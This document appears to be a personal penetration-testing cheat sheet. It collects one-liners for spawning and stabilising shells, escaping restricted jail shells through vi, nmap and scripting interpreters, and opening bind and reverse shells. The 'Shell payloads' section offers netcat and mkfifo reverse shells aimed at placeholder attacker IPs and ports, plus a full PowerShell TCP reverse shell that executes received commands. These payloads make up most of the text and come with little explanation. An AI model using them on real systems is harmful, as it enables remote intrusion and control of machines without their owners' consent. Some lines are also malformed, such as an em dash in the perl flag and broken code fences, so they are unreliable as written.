# Shell Spawning

ALSO: /usr/bin/script -qc /bin/bash /dev/null
-  ``` python -c 'import pty; pty.spawn("/bin/sh")'```
    
-   ```echo os.system('/bin/bash')```
    
-   ```/bin/sh -i```
    
-```   perl —e 'exec "/bin/sh";'```
    
-   ```perl: exec "/bin/sh";```
    
-   ```ruby: exec "/bin/sh"```
    
-  ``` lua: os.execute('/bin/sh')```
    
-   ```
-   (From within IRB)
    
    exec "/bin/sh"```
    
-   (```From within vi)
    
    :!bash```
    
-   ```(From within vi)
    
    :set shell=/bin/bash:shell```
    
-   ```(From within nmap)
    
    !sh```
    

Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.

# Making the shell interactive: 

1.  ```python -c 'import pty;pty.spawn("/bin/bash")'```
2.  ```export TERM=xterm``` - this will give us access to term commands such as 'clear'.
3.  background the current shell using CTRL+Z, then type: ```stty raw -echo; fg```  -- This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

**rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.**


## Changing the terminal size of columns and rows: 

```
stty -a 

stty cols 999
stty rows 999
```



# Shell payloads

### Bind shell: 
```nc -nvlp {IP} {PORT} -e /bin/bash```

### Reverse shell: 
```nc {IP} {PORT} -e /bin/bash```


### Where the above won't work: 
### Bind shell:
```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f```

### Reverse shell
 
```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f```


### Good one liner POWERSHELL reverse shell: 
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```